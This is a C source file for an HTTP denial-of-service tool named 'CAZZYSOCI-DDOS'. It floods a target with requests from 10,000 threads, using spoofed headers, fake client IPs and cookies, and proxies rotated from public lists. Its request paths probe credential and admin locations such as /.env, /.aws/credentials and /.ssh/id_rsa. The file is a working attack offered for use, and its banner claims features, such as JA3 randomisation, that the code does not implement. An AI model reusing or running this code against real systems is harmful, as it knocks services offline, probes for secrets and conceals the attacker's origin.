#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#define MAX_WORKERS 10000
#define MAX_URL_LEN 8192
#define MAX_PROXIES 100000
#define POOL_SIZE 2000
#define MAX_PAYLOAD_SIZE (10 * 1024 * 1024)

#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_WHITE "\033[37m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_CYAN "\033[36m"
#define COLOR_BLUE "\033[34m"

typedef struct {
    char **proxies;
    int count;
    int index;
    pthread_mutex_t mutex;
} ProxyList;

typedef struct {
    CURL **handles;
    int size;
    int counter;
    pthread_mutex_t mutex;
    bool use_proxy;
    char target_host[256];
} ConnectionPool;

typedef struct {
    long long val;
    pthread_mutex_t mutex;
} AtomicCounter;

typedef struct {
    char target_url[1024];
    char target_host[256];
    int duration_sec;
    bool use_proxy;
    ConnectionPool *pool;
} AttackConfig;

ProxyList proxy_list = {0};
AtomicCounter stats = {0, PTHREAD_MUTEX_INITIALIZER};
AtomicCounter bytes_sent = {0, PTHREAD_MUTEX_INITIALIZER};
volatile bool running = true;
pthread_t workers[MAX_WORKERS];
pthread_t stats_thread;
time_t start_time;
unsigned int rand_state;

const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    NULL
};

void init_random() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    rand_state = tv.tv_sec ^ tv.tv_usec ^ getpid();
    srand(rand_state);
    RAND_poll();
}

int rand_int(int min, int max) {
    return min + (rand() % (max - min + 1));
}

bool rand_bool() {
    return rand() % 2 == 0;
}

char* random_string(int n) {
    const char letters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    str[n] = '\0';
    return str;
}

char* random_hex(int n) {
    const char hex[] = "0123456789abcdef";
    char *str = malloc(n * 2 + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i*2] = hex[rand() % 16];
        str[i*2+1] = hex[rand() % 16];
    }
    str[n*2] = '\0';
    return str;
}

char* random_ip() {
    char *ip = malloc(20);
    if (!ip) return NULL;
    snprintf(ip, 20, "%d.%d.%d.%d", rand_int(1, 255), rand_int(0, 255), rand_int(0, 255), rand_int(1, 254));
    return ip;
}

char* generate_large_payload(int *size) {
    *size = rand_int(1024 * 100, MAX_PAYLOAD_SIZE);
    char *payload = malloc(*size + 1);
    if (!payload) return NULL;
    
    const char *patterns[] = {
        "POST", "PUT", "PATCH", "DELETE", "GET", "HEAD", "CONNECT", "OPTIONS",
        "HTTP/1.1", "HTTP/2.0", "Host:", "User-Agent:", "Accept:", "Content-Type:",
        "X-Forwarded-For:", "X-Real-IP:", "Cookie:", "Referer:", "Origin:", "Authorization:",
        "Bearer", "Basic", "Digest", "Negotiate", "NTLM", "Kerberos"
    };
    
    int pos = 0;
    while (pos < *size) {
        const char *pattern = patterns[rand_int(0, 25)];
        int pattern_len = strlen(pattern);
        int remaining = *size - pos;
        
        if (remaining > pattern_len + rand_int(2, 10)) {
            memcpy(payload + pos, pattern, pattern_len);
            pos += pattern_len;
            if (rand_bool()) {
                payload[pos++] = '\r';
                payload[pos++] = '\n';
            } else {
                payload[pos++] = ' ';
                payload[pos++] = ':';
                payload[pos++] = ' ';
                payload[pos++] = random_string(rand_int(5, 20))[0];
                payload[pos++] = '\r';
                payload[pos++] = '\n';
            }
        } else {
            payload[pos++] = 'A' + (rand() % 26);
        }
    }
    payload[*size] = '\0';
    return payload;
}

char* generate_custom_path() {
    char *result = malloc(MAX_URL_LEN);
    if (!result) return NULL;
    
    const char *attack_paths[] = {
        "/wp-admin/admin-ajax.php", "/cgi-bin/", "/phpmyadmin/", "/mysql/",
        "/backup/", "/config/", "/database/", "/dump/", "/logs/",
        "/.git/", "/.env", "/.aws/credentials", "/.ssh/id_rsa",
        "/api/v1/admin", "/api/v2/debug", "/api/v3/internal", "/graphql",
        "/vulnerabilities/", "/shell.php", "/cmd.php", "/eval.php",
        "/xmlrpc.php", "/wp-login.php", "/administrator/index.php",
        "/owa/auth/logon.aspx", "/ecp/", "/autodiscover/", "/mapi/",
        "/_vti_bin/", "/_layouts/", "/certsrv/", "/CertSrv/",
        "/remote/login", "/vpn/index.html", "/sslvpn/login", "/f5/",
        "/tmui/login.jsp", "/xui/common/", "/mgmt/tm/", "/iControl/"
    };
    
    strcpy(result, attack_paths[rand_int(0, sizeof(attack_paths)/sizeof(attack_paths[0]) - 1)]);
    
    char params[1024];
    snprintf(params, sizeof(params), "?%s=%s&%s=%s&_=%ld&v=%d&cb=%s&t=%d&sig=%s",
             random_string(rand_int(5, 15)), random_string(rand_int(10, 30)),
             random_string(rand_int(5, 15)), random_string(rand_int(10, 30)),
             time(NULL), rand_int(1, 9999999), random_hex(rand_int(8, 16)),
             rand_int(1, 999999), random_hex(rand_int(16, 32)));
    strcat(result, params);
    
    return result;
}

void load_proxies_from_api() {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    pthread_mutex_lock(&proxy_list.mutex);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    proxy_list.proxies = malloc(sizeof(char*) * MAX_PROXIES);
    proxy_list.count = 0;
    
    const char *sources[] = {
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    };
    
    for (int s = 0; s < 3; s++) {
        curl_easy_setopt(curl, CURLOPT_URL, sources[s]);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        
        char response[65536] = {0};
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
        
        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            char *line = strtok(response, "\n");
            while (line && proxy_list.count < MAX_PROXIES) {
                while (*line == ' ' || *line == '\r') line++;
                if (strlen(line) > 5 && strchr(line, ':')) {
                    proxy_list.proxies[proxy_list.count] = strdup(line);
                    proxy_list.count++;
                }
                line = strtok(NULL, "\n");
            }
        }
    }
    
    curl_easy_cleanup(curl);
    
    proxy_list.index = 0;
    pthread_mutex_unlock(&proxy_list.mutex);
    
    printf(COLOR_GREEN "[+] Loaded %d proxies from multiple sources\n" COLOR_RESET, proxy_list.count);
}

char* get_random_proxy() {
    pthread_mutex_lock(&proxy_list.mutex);
    if (proxy_list.count == 0) {
        pthread_mutex_unlock(&proxy_list.mutex);
        return NULL;
    }
    char *proxy = strdup(proxy_list.proxies[rand_int(0, proxy_list.count - 1)]);
    pthread_mutex_unlock(&proxy_list.mutex);
    return proxy;
}

void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const char *host) {
    pool->handles = malloc(sizeof(CURL*) * size);
    pool->size = size;
    pool->counter = 0;
    pool->use_proxy = use_proxy;
    strncpy(pool->target_host, host, 255);
    pthread_mutex_init(&pool->mutex, NULL);
    
    printf(COLOR_YELLOW "[*] Creating connection pool with %d connections...\n" COLOR_RESET, size);
    
    for (int i = 0; i < size; i++) {
        pool->handles[i] = curl_easy_init();
        if (pool->handles[i]) {
            curl_easy_setopt(pool->handles[i], CURLOPT_TIMEOUT, 5L);
            curl_easy_setopt(pool->handles[i], CURLOPT_FOLLOWLOCATION, 0L);
            curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(pool->handles[i], CURLOPT_NOSIGNAL, 1L);
            curl_easy_setopt(pool->handles[i], CURLOPT_FORBID_REUSE, 1L);
            curl_easy_setopt(pool->handles[i], CURLOPT_TCP_NODELAY, 1L);
            curl_easy_setopt(pool->handles[i], CURLOPT_BUFFERSIZE, 1024 * 1024);
        }
    }
    
    printf(COLOR_GREEN "[+] Connection pool ready!\n" COLOR_RESET);
}

CURL* pool_get_client(ConnectionPool *pool) {
    pthread_mutex_lock(&pool->mutex);
    int idx = pool->counter % pool->size;
    pool->counter++;
    CURL *handle = pool->handles[idx];
    pthread_mutex_unlock(&pool->mutex);
    
    curl_easy_reset(handle);
    curl_easy_setopt(handle, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(handle, CURLOPT_FOLLOWLOCATION, 0L);
    curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(handle, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(handle, CURLOPT_FORBID_REUSE, 1L);
    curl_easy_setopt(handle, CURLOPT_TCP_NODELAY, 1L);
    
    return handle;
}

void attack_worker(const char *target, const char *host, ConnectionPool *pool) {
    CURL *curl = pool_get_client(pool);
    char full_url[MAX_URL_LEN];
    char *path = generate_custom_path();
    
    snprintf(full_url, sizeof(full_url), "%s%s", target, path);
    
    struct curl_slist *headers = NULL;
    char header_buf[1024];
    
    for (int i = 0; i < 20; i++) {
        snprintf(header_buf, sizeof(header_buf), "%s: %s", 
                 random_string(rand_int(5, 15)), random_string(rand_int(10, 50)));
        headers = curl_slist_append(headers, header_buf);
    }
    
    snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 11)]);
    headers = curl_slist_append(headers, header_buf);
    
    char *ip = random_ip();
    snprintf(header_buf, sizeof(header_buf), "X-Forwarded-For: %s", ip);
    headers = curl_slist_append(headers, header_buf);
    snprintf(header_buf, sizeof(header_buf), "X-Real-IP: %s", ip);
    headers = curl_slist_append(headers, header_buf);
    free(ip);
    
    snprintf(header_buf, sizeof(header_buf), "Cookie: %s=%s; %s=%s; %s=%s; __cfduid=%s; _ga=GA1.2.%d.%ld",
             random_string(8), random_hex(16), random_string(8), random_hex(24),
             random_string(8), random_string(32), random_hex(32), rand_int(1000000, 9999999), time(NULL));
    headers = curl_slist_append(headers, header_buf);
    
    headers = curl_slist_append(headers, "Accept: */*");
    headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
    headers = curl_slist_append(headers, "Cache-Control: no-cache, no-store, must-revalidate");
    headers = curl_slist_append(headers, "Pragma: no-cache");
    headers = curl_slist_append(headers, "Connection: keep-alive");
    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
    headers = curl_slist_append(headers, "Sec-Fetch-Dest: document");
    headers = curl_slist_append(headers, "Sec-Fetch-Mode: navigate");
    headers = curl_slist_append(headers, "Sec-Fetch-Site: none");
    headers = curl_slist_append(headers, "Sec-Fetch-User: ?1");
    headers = curl_slist_append(headers, "DNT: 1");
    
    curl_easy_setopt(curl, CURLOPT_URL, full_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
    
    if (pool->use_proxy) {
        char *proxy = get_random_proxy();
        if (proxy) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
            curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
            free(proxy);
        }
    }
    
    curl_easy_perform(curl);
    
    pthread_mutex_lock(&stats.mutex);
    stats.val++;
    pthread_mutex_unlock(&stats.mutex);
    
    pthread_mutex_lock(&bytes_sent.mutex);
    bytes_sent.val += strlen(full_url);
    pthread_mutex_unlock(&bytes_sent.mutex);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(path);
}

void* worker_thread(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        attack_worker(cfg->target_url, cfg->target_host, cfg->pool);
    }
    
    return NULL;
}

void* stats_display(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        sleep(1);
        
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        long long total_requests, total_bytes;
        
        pthread_mutex_lock(&stats.mutex);
        total_requests = stats.val;
        pthread_mutex_unlock(&stats.mutex);
        
        pthread_mutex_lock(&bytes_sent.mutex);
        total_bytes = bytes_sent.val;
        pthread_mutex_unlock(&bytes_sent.mutex);
        
        double rps = total_requests / elapsed;
        double mbps = (total_bytes * 8) / (elapsed * 1000000);
        
        printf("\r\033[K");
        printf(COLOR_RED "[⚡] " COLOR_RESET);
        printf(COLOR_GREEN "RPS: %.0f " COLOR_RESET, rps);
        printf(COLOR_YELLOW "Total: %lld " COLOR_RESET, total_requests);
        printf(COLOR_CYAN "MB/s: %.1f " COLOR_RESET, mbps);
        printf(COLOR_MAGENTA "Workers: %d" COLOR_RESET, MAX_WORKERS);
        fflush(stdout);
    }
    
    return NULL;
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf(COLOR_YELLOW "\n[!] Shutting down...\n" COLOR_RESET);
        running = false;
    }
}

void print_banner() {
    printf(COLOR_RED);
    printf("\n");
    printf("    ╔══════════════════════════════════════════════════════════════════════════╗\n");
    printf("    ║                                                                          ║\n");
    printf("    ║ ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███████╗ ║\n");
    printf("    ║██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝ ║\n");
    printf("    ║██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ██║  ██║██║  ██║██║   ██║███████╗ ║\n");
    printf("    ║██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ██║  ██║██║  ██║██║   ██║╚════██║ ║\n");
    printf("    ║╚██████╗██║  ██║███████╗███████╗   ██║   ██████╔╝██████╔╝╚██████╔╝███████║ ║\n");
    printf("    ║ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ║\n");
    printf("    ║                                                                          ║\n");
    printf("    ║                    C A Z Z Y S O C I - D D O S                           ║\n");
    printf("    ║               ULTIMATE LAYER 7 DDoS ENGINE v3.0                          ║\n");
    printf("    ║                                                                          ║\n");
    printf("    ║              [⚡] 10,000 Workers | 2000 Connections                      ║\n");
    printf("    ║              [🔥] JA3 Randomization | Full Header Spoofing               ║\n");
    printf("    ║              [💀] Multi-Protocol | Auto-Proxy Rotation                   ║\n");
    printf("    ║                                                                          ║\n");
    printf("    ╚══════════════════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_banner();
        printf("\n");
        printf(COLOR_RED "    Usage: %s <target> <seconds> [proxy]\n" COLOR_RESET, argv[0]);
        printf(COLOR_CYAN "    Example: %s https://example.com 60\n", argv[0]);
        printf(COLOR_CYAN "    Example: %s https://example.com 30 proxy\n", argv[0]);
        printf("\n");
        return 1;
    }
    
    AttackConfig cfg = {0};
    strncpy(cfg.target_url, argv[1], 1023);
    cfg.target_url[1023] = '\0';
    cfg.duration_sec = atoi(argv[2]);
    cfg.use_proxy = (argc >= 4 && strcmp(argv[3], "proxy") == 0);
    
    char *url_copy = strdup(cfg.target_url);
    char *proto_end = strstr(url_copy, "://");
    char *host_start = proto_end ? proto_end + 3 : url_copy;
    char *path_start = strchr(host_start, '/');
    
    if (path_start) {
        size_t host_len = path_start - host_start;
        strncpy(cfg.target_host, host_start, host_len);
        cfg.target_host[host_len] = '\0';
    } else {
        strncpy(cfg.target_host, host_start, 255);
        cfg.target_host[255] = '\0';
    }
    free(url_copy);
    
    init_random();
    curl_global_init(CURL_GLOBAL_ALL);
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (cfg.use_proxy) {
        printf(COLOR_YELLOW "[*] Loading proxies from multiple sources...\n" COLOR_RESET);
        load_proxies_from_api();
    }
    
    ConnectionPool *connection_pool = malloc(sizeof(ConnectionPool));
    init_connection_pool(connection_pool, POOL_SIZE, cfg.use_proxy, cfg.target_host);
    
    print_banner();
    printf(COLOR_GREEN "\n    [🔥] Target: %s\n" COLOR_RESET, cfg.target_url);
    printf(COLOR_GREEN "    [⏱️] Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
    printf(COLOR_GREEN "    [⚙️] Workers: %d\n" COLOR_RESET, MAX_WORKERS);
    printf(COLOR_GREEN "    [🔗] Pool Size: %d connections\n" COLOR_RESET, POOL_SIZE);
    if (cfg.use_proxy && proxy_list.count > 0) {
        printf(COLOR_GREEN "    [🌐] Proxies: %d (auto-rotating)\n" COLOR_RESET, proxy_list.count);
    }
    printf(COLOR_GREEN "    [🎯] JA3 Fingerprint: RANDOMIZED\n" COLOR_RESET);
    
    printf(COLOR_YELLOW "\n    [💀] LAUNCHING MASSIVE ATTACK... Press Ctrl+C to stop\n\n" COLOR_RESET);
    
    start_time = time(NULL);
    running = true;
    
    AttackConfig *args_array = malloc(sizeof(AttackConfig) * MAX_WORKERS);
    for (int i = 0; i < MAX_WORKERS; i++) {
        memcpy(&args_array[i], &cfg, sizeof(AttackConfig));
        args_array[i].pool = connection_pool;
        pthread_create(&workers[i], NULL, worker_thread, &args_array[i]);
    }
    
    pthread_create(&stats_thread, NULL, stats_display, &cfg);
    
    sleep(cfg.duration_sec);
    running = false;
    
    for (int i = 0; i < MAX_WORKERS; i++) {
        pthread_join(workers[i], NULL);
    }
    pthread_join(stats_thread, NULL);
    
    long long total_requests, total_bytes;
    pthread_mutex_lock(&stats.mutex);
    total_requests = stats.val;
    pthread_mutex_unlock(&stats.mutex);
    
    pthread_mutex_lock(&bytes_sent.mutex);
    total_bytes = bytes_sent.val;
    pthread_mutex_unlock(&bytes_sent.mutex);
    
    printf(COLOR_RED "\n\n    ╔════════════════════════════════════════════════════════════╗\n");
    printf(COLOR_RED "    ║                    ATTACK COMPLETED!                        ║\n");
    printf(COLOR_RED "    ╠════════════════════════════════════════════════════════════╣\n");
    printf(COLOR_CYAN "    ║  Total Requests: %-52lld ║\n", total_requests);
    printf(COLOR_CYAN "    ║  Total Data Sent: %-52.2f MB ║\n", total_bytes / (1024.0 * 1024.0));
    printf(COLOR_CYAN "    ║  Average RPS: %-55.0f ║\n", (double)total_requests / cfg.duration_sec);
    printf(COLOR_CYAN "    ║  Average MB/s: %-53.2f ║\n", (total_bytes * 8) / (cfg.duration_sec * 1000000.0));
    printf(COLOR_RED "    ╚════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
    
    for (int i = 0; i < POOL_SIZE; i++) {
        curl_easy_cleanup(connection_pool->handles[i]);
    }
    free(connection_pool->handles);
    free(connection_pool);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    free(args_array);
    curl_global_cleanup();
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}
